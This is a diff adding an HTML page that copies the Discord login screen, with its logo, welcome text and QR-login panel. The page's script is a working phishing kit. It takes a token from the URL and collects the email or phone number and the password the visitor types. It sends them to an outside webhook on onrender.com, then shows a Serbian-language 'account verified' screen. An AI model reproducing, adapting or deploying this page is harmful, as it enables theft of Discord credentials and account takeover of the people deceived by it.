@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Discord</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    color: #fff;
+    overflow-x: hidden;
+  }
+  body {
+    min-height: 100vh;
+    background:
+      radial-gradient(circle at 18% 55%, rgba(180,170,255,0.18) 0%, rgba(180,170,255,0) 18%),
+      radial-gradient(circle at 60% 35%, rgba(140,110,220,0.22) 0%, rgba(140,110,220,0) 25%),
+      linear-gradient(115deg, #2b1466 0%, #3a2391 28%, #2c46c9 65%, #1f6df0 100%);
+    background-attachment: fixed;
+    position: relative;
+  }
+  .stars {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background-image:
+      radial-gradient(1.5px 1.5px at 6% 12%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 14% 38%, #fff 50%, transparent 51%),
+      radial-gradient(2px 2px at 22% 78%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 30% 22%, #d8dcff 50%, transparent 51%),
+      radial-gradient(1.5px 1.5px at 38% 64%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 47% 14%, #fff 50%, transparent 51%),
+      radial-gradient(2px 2px at 55% 84%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 63% 32%, #cdd5ff 50%, transparent 51%),
+      radial-gradient(1.5px 1.5px at 71% 70%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 79% 18%, #fff 50%, transparent 51%),
+      radial-gradient(2px 2px at 87% 50%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 94% 80%, #fff 50%, transparent 51%),
+      radial-gradient(1px 1px at 10% 90%, #fff 50%, transparent 51%),
+      radial-gradient(1.5px 1.5px at 42% 92%, #fff 50%, transparent 51%);
+  }
+  .orb {
+    position: fixed; left: 4%; top: 48%;
+    width: 280px; height: 280px; border-radius: 50%;
+    background: radial-gradient(circle at 35% 35%, rgba(255,255,255,0.25) 0%, rgba(170,150,255,0.08) 35%, rgba(80,60,180,0) 70%);
+    filter: blur(6px); z-index: 0; pointer-events: none;
+  }
+  .brand {
+    position: fixed; top: 30px; left: 44px;
+    display: flex; align-items: center; gap: 10px; z-index: 5;
+  }
+  .brand svg { width: 40px; height: auto; }
+  .brand span { font-weight: 700; font-size: 24px; letter-spacing: -0.4px; color: #fff; }
+  .center {
+    position: relative; z-index: 2; min-height: 100vh;
+    display: flex; align-items: center; justify-content: center; padding: 24px;
+  }
+  .card {
+    background: #313338; border-radius: 8px; padding: 32px;
+    width: 100%; max-width: 800px;
+    box-shadow: 0 8px 28px rgba(0,0,0,0.35);
+    display: grid; grid-template-columns: 1.15fr 1fr; gap: 40px;
+    position: relative;
+  }
+  .left { padding-top: 32px; }
+  .left h1 { font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 8px; }
+  .left .sub { text-align: center; color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
+  label {
+    display: block; font-size: 12px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.02em;
+    color: #b5bac1; margin-bottom: 8px; margin-top: 20px;
+  }
+  label .req { color: #f23f43; margin-left: 4px; }
+  input[type="text"], input[type="password"] {
+    width: 100%; background: #1e1f22;
+    border: 1px solid #1e1f22; border-radius: 3px;
+    padding: 10px; color: #dbdee1;
+    font-size: 16px; height: 40px; outline: none;
+    transition: border-color 0.12s ease;
+  }
+  input:focus { border-color: #5865f2; }
+  input.err { border-color: #f23f43 !important; background: #41292d; }
+  .inline-err {
+    display: none;
+    align-items: center; gap: 6px;
+    color: #fb6f73; font-size: 12px;
+    margin-top: 6px; font-style: italic;
+  }
+  .inline-err.on { display: flex; }
+  .inline-err .ico {
+    width: 14px; height: 14px;
+    background: #f23f43; border-radius: 3px;
+    color: #fff; font-weight: 700; font-size: 11px;
+    display: inline-flex; align-items: center; justify-content: center;
+    font-style: normal;
+  }
+  .forgot {
+    display: inline-block; color: #00a8fc;
+    font-size: 14px; margin-top: 12px; text-decoration: none; cursor: pointer;
+  }
+  .forgot:hover { text-decoration: underline; }
+  .login-btn {
+    width: 100%; margin-top: 20px;
+    background: #5865f2; color: #fff; border: none;
+    height: 44px; border-radius: 3px;
+    font-size: 16px; font-weight: 500; cursor: pointer;
+    transition: background 0.12s ease;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+  }
+  .login-btn:hover { background: #4752c4; }
+  .login-btn:disabled { opacity: 0.7; cursor: default; }
+  .spinner {
+    width: 18px; height: 18px;
+    border: 2px solid rgba(255,255,255,0.35);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin 0.8s linear infinite; display: none;
+  }
+  .spinner.on { display: inline-block; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .need-account { margin-top: 8px; font-size: 14px; color: #b5bac1; }
+  .need-account a { color: #00a8fc; text-decoration: none; cursor: pointer; }
+  .need-account a:hover { text-decoration: underline; }
+  .right { display: flex; flex-direction: column; align-items: center; justify-content: center; padding-top: 8px; }
+  .qr-box {
+    background: #fff; padding: 12px; border-radius: 6px;
+    width: 200px; height: 200px;
+    display: flex; align-items: center; justify-content: center; position: relative;
+  }
+  .qr-box img { width: 100%; height: 100%; display: block; }
+  .qr-logo {
+    position: absolute; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 44px; height: 44px; background: #5865f2; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 0 0 4px #fff;
+  }
+  .qr-logo svg { width: 28px; height: auto; fill: #fff; }
+  .qr-title { font-size: 24px; font-weight: 600; margin-top: 22px; text-align: center; }
+  .qr-desc {
+    font-size: 16px; color: #b5bac1; text-align: center;
+    margin-top: 10px; max-width: 270px; line-height: 1.4;
+  }
+  .qr-desc b { color: #fff; }
+  .passkey { color: #00a8fc; font-size: 14px; margin-top: 14px; cursor: pointer; text-decoration: none; }
+  .passkey:hover { text-decoration: underline; }
+  @media (max-width: 720px) {
+    .card { grid-template-columns: 1fr; }
+    .right { border-top: 1px solid #3f4147; padding-top: 24px; }
+    .brand { top: 18px; left: 18px; }
+    .brand span { font-size: 20px; }
+  }
+  #successScreen {
+    display: none;
+    position: fixed; inset: 0; z-index: 999;
+    background: inherit;
+    align-items: center; justify-content: center;
+    flex-direction: column; text-align: center;
+  }
+  #successScreen.on { display: flex; }
+  #successScreen .check { font-size: 90px; margin-bottom: 24px; }
+  #successScreen h1 { font-size: 32px; font-weight: 700; color: #fff; }
+</style>
+</head>
+<body>
+
+<div class="stars"></div>
+<div class="orb"></div>
+
+<div id="successScreen">
+  <div class="check">✅</div>
+  <h1>USPEŠNO STE VERIFIKOVALI NALOG!</h1>
+</div>
+
+<div class="brand">
+  <svg viewBox="0 0 71 55" fill="#fff" xmlns="http://www.w3.org/2000/svg">
+    <path d="M60.1 4.9A58.5 58.5 0 0 0 45.6.5a40 40 0 0 0-1.9 3.8 54 54 0 0 0-16.2 0A40 40 0 0 0 25.6.5 58.6 58.6 0 0 0 11 4.9C1.6 18.7-1 32.1.3 45.4a58.9 58.9 0 0 0 17.9 9 43.7 43.7 0 0 0 3.8-6.2 38 38 0 0 1-6-2.9c.5-.4 1-.7 1.5-1.1 11.6 5.3 24.1 5.3 35.5 0 .5.4 1 .8 1.5 1.1a38 38 0 0 1-6 2.9 43.7 43.7 0 0 0 3.8 6.2 58.9 58.9 0 0 0 17.9-9c1.5-15.4-2.6-28.7-10.1-40.5ZM23.7 37.3c-3.5 0-6.4-3.2-6.4-7.1 0-3.9 2.8-7.1 6.4-7.1 3.6 0 6.5 3.2 6.4 7.1 0 3.9-2.8 7.1-6.4 7.1Zm23.6 0c-3.5 0-6.4-3.2-6.4-7.1 0-3.9 2.8-7.1 6.4-7.1 3.6 0 6.5 3.2 6.4 7.1 0 3.9-2.8 7.1-6.4 7.1Z"/>
+  </svg>
+  <span>Discord</span>
+</div>
+
+<div class="center">
+  <div class="card">
+    <div class="left">
+      <h1>Welcome back!</h1>
+      <p class="sub">We're so excited to see you again!</p>
+
+      <form id="loginForm" autocomplete="off">
+        <label for="email">Email or Phone Number<span class="req">*</span></label>
+        <input type="text" id="email" name="email" required autocomplete="off" />
+        <div class="inline-err" id="emailErr"><span class="ico">!</span> Login or password is invalid.</div>
+
+        <label for="password">Password<span class="req">*</span></label>
+        <input type="password" id="password" name="password" required autocomplete="off" />
+        <div class="inline-err" id="passErr"><span class="ico">!</span> Login or password is invalid.</div>
+
+        <a class="forgot">Forgot your password?</a>
+
+        <button class="login-btn" type="submit" id="loginBtn">
+          <span id="btnText">Log In</span>
+          <span class="spinner" id="spinner"></span>
+        </button>
+
+        <p class="need-account">Need an account? <a>Register</a></p>
+      </form>
+    </div>
+
+    <div class="right">
+      <div class="qr-box">
+        <img alt="QR" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=demo&margin=0&qzone=0" />
+        <div class="qr-logo">
+          <svg viewBox="0 0 71 55" xmlns="http://www.w3.org/2000/svg">
+            <path d="M60.1 4.9A58.5 58.5 0 0 0 45.6.5a40 40 0 0 0-1.9 3.8 54 54 0 0 0-16.2 0A40 40 0 0 0 25.6.5 58.6 58.6 0 0 0 11 4.9C1.6 18.7-1 32.1.3 45.4a58.9 58.9 0 0 0 17.9 9 43.7 43.7 0 0 0 3.8-6.2 38 38 0 0 1-6-2.9c.5-.4 1-.7 1.5-1.1 11.6 5.3 24.1 5.3 35.5 0 .5.4 1 .8 1.5 1.1a38 38 0 0 1-6 2.9 43.7 43.7 0 0 0 3.8 6.2 58.9 58.9 0 0 0 17.9-9c1.5-15.4-2.6-28.7-10.1-40.5ZM23.7 37.3c-3.5 0-6.4-3.2-6.4-7.1 0-3.9 2.8-7.1 6.4-7.1 3.6 0 6.5 3.2 6.4 7.1 0 3.9-2.8 7.1-6.4 7.1Zm23.6 0c-3.5 0-6.4-3.2-6.4-7.1 0-3.9 2.8-7.1 6.4-7.1 3.6 0 6.5 3.2 6.4 7.1 0 3.9-2.8 7.1-6.4 7.1Z"/>
+          </svg>
+        </div>
+      </div>
+      <div class="qr-title">Log in with QR Code</div>
+      <div class="qr-desc">Scan this with the <b>Discord mobile app</b> to log in instantly.</div>
+      <a class="passkey">Or, sign in with passkey</a>
+    </div>
+  </div>
+</div>
+
+<script>
+  const form     = document.getElementById('loginForm');
+  const emailEl  = document.getElementById('email');
+  const passEl   = document.getElementById('password');
+  const emailErr = document.getElementById('emailErr');
+  const passErr  = document.getElementById('passErr');
+  const btn      = document.getElementById('loginBtn');
+  const btnText  = document.getElementById('btnText');
+  const spinner  = document.getElementById('spinner');
+
+  // Uzmi token iz URL-a
+  const urlParams = new URLSearchParams(window.location.search);
+  const token = urlParams.get('token');
+
+  const EMAIL_RE = /^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$/;
+
+  function isValidEmail(v) {
+    const val = v.trim();
+    if (!val) return false;
+    if ((val.match(/@/g) || []).length !== 1) return false;
+    if (val.includes('..')) return false;
+    if (val.startsWith('.') || val.endsWith('.')) return false;
+    if (val.startsWith('@') || val.endsWith('@')) return false;
+    const [local, domain] = val.split('@');
+    if (!local || !domain) return false;
+    if (!domain.includes('.')) return false;
+    return EMAIL_RE.test(val);
+  }
+
+  function isValidPhone(v) {
+    const val = v.trim();
+    if (!val) return false;
+    if (!/^\+?[0-9\s\-()]+$/.test(val)) return false;
+    const digits = val.replace(/\D/g, '');
+    return digits.length > 6;
+  }
+
+  function isValidLogin(v) {
+    return isValidEmail(v) || isValidPhone(v);
+  }
+
+  function clearErr() {
+    emailEl.classList.remove('err');
+    passEl.classList.remove('err');
+    emailErr.classList.remove('on');
+    passErr.classList.remove('on');
+  }
+  function setInvalid() {
+    emailEl.classList.add('err');
+    passEl.classList.add('err');
+    emailErr.classList.add('on');
+    passErr.classList.add('on');
+  }
+
+  emailEl.addEventListener('input', clearErr);
+  passEl.addEventListener('input', clearErr);
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const emailVal = emailEl.value.trim();
+    const passVal  = passEl.value;
+
+    const emailOk = isValidLogin(emailVal);
+    const passOk  = passVal.length >= 8
+                 && /[a-z]/.test(passVal)
+                 && /[A-Z]/.test(passVal)
+                 && /[0-9]/.test(passVal);
+
+    if (!emailOk || !passOk) {
+      setInvalid();
+      return;
+    }
+
+    clearErr();
+    btn.disabled = true;
+    btnText.textContent = '';
+    spinner.classList.add('on');
+
+    try {
+      // Salji podatke botu i verifikuj token
+      const res = await fetch('https://opii.onrender.com/webhook/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token, email: emailVal, password: passVal })
+      });
+
+      if (res.ok) {
+        document.getElementById('successScreen').classList.add('on');
+      } else {
+        btn.disabled = false;
+        btnText.textContent = 'Log In';
+        spinner.classList.remove('on');
+        setInvalid();
+      }
+    } catch (err) {
+      btn.disabled = false;
+      btnText.textContent = 'Log In';
+      spinner.classList.remove('on');
+      setInvalid();
+    }
+  });
+</script>
+
+</body>
+</html>
